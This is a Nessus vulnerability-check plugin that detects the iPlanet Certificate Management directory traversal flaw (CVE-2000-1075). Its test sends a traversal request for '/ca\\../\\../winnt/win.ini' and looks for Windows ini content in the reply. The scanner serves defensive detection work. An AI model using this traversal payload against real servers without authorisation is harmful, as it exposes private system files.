#
# (C) Tenable Network Security, Inc.
#

#
# XXX might be redundant with plugin #10589
#


include("compat.inc");

if(description)
{
 script_id(10683);
 script_version ("$Revision: 1.24 $");

 script_cve_id("CVE-2000-1075");
 script_bugtraq_id(1839);
 script_osvdb_id(486, 4086);

 script_name(english:"iPlanet Certificate Management Traversal Arbitrary File Access");
 script_summary(english:"\..\..\file.txt");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server is affected by an information disclosure 
vulnerability." );
 script_set_attribute(attribute:"description", value:
"It is possible to read arbitrary files on
the remote server by prepending /ca/\../\../
in front on the file name." );
 # http://web.archive.org/web/20031016105939/http://www2.corest.com/common/showdoc.php?idx=123&idxseccion=10
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?8ffab934" );
 script_set_attribute(attribute:"solution", value:
"The vendor has released a patch to fix the issue." );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:ND/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

 script_set_attribute(attribute:"plugin_publication_date", value: "2001/05/29");
 script_set_attribute(attribute:"vuln_publication_date", value: "2000/10/26");
 script_cvs_date("$Date: 2016/05/16 14:02:51 $");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_end_attributes();
 
 script_category(ACT_ATTACK);
 
 script_copyright(english:"This script is Copyright (C) 2001-2016 Tenable Network Security, Inc.");
 script_family(english:"Web Servers");

 script_dependencie("http_version.nasl");
 script_require_ports("Services/www", 443);
 exit(0);
}

#
# The script code starts here
#

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:443);
banner = get_http_banner(port:port);
if ( "iPlanet" >!< banner ) exit(0);

res = http_send_recv3(method:"GET", item:string("/ca\\../\\../\\../\\../winnt/win.ini"), port:port);
if (isnull(res)) exit(1, "The web server on port "+port+" failed to respond.");
# ssl negot. is done by nessusd, transparently.

if (("[windows]" >< res[2]) ||
    ("[fonts]" >< res[2])){
  security_warning(port:port);
}
